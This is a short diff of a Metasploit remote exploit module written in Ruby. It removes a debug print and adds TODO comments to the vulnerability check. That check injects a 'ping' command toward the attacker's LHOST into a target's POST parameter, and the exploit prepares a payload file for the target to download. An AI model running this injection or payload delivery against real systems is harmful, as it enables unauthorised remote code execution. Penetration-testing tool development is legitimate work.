@@ -86,7 +86,6 @@ class MetasploitModule < Msf::Exploit::Remote
       File.read(datastore['URI_LIST']).each_line do |uri|
         response_get = request_get(uri.chomp)
         if response_get && response_get.code == 200
-#          print_good("Got 200 OK for #{uri.chomp}")
           return uri.chomp
         end
       end
@@ -96,16 +95,15 @@ class MetasploitModule < Msf::Exploit::Remote
 
   # check for vulnerability existence
   def check
-    lhost = datastore['LHOST'] # implied
-    vuln_check_param = "ping -c 1 #{lhost}"
+    lhost = datastore['LHOST'] # implied, required for the "ping" check -_-
+    vuln_check_param = "ping -c 1 #{lhost}" # make this an actual check instead of a ping
     target_uri = find_uri
     if target_uri == "fail"
       fail_with Failure::NotVulnerable, 'Target is not vulnerable.'
     else
-      print_status("Checking for existence of vulnerability in #{target_uri}...")
       response_post = request_post(target_uri,vuln_check_param)
-      if response_post && response_post.code == 200
-        print_good("Got 200 OK for #{target_uri}")
+      if response_post && response_post.code == 200 # and includes something that ensures that it's vulnerable
+        print_good("Got 200 OK for #{target_uri}") # also indicate that its vulnerable
         return Exploit::CheckCode::Vulnerable
       else
         return Exploit::CheckCode::Safe
@@ -120,7 +118,6 @@ class MetasploitModule < Msf::Exploit::Remote
     unless [CheckCode::Vulnerable].include? check
       fail_with Failure::NotVulnerable, 'Target is not vulnerable.'
     end
-
     lhost = datastore['LHOST'].to_s
     downfile = datastore['URIPATH'] || rand_text_alpha(8+rand(8))
     resource_uri = '/' + downfile # the payload to be downloaded
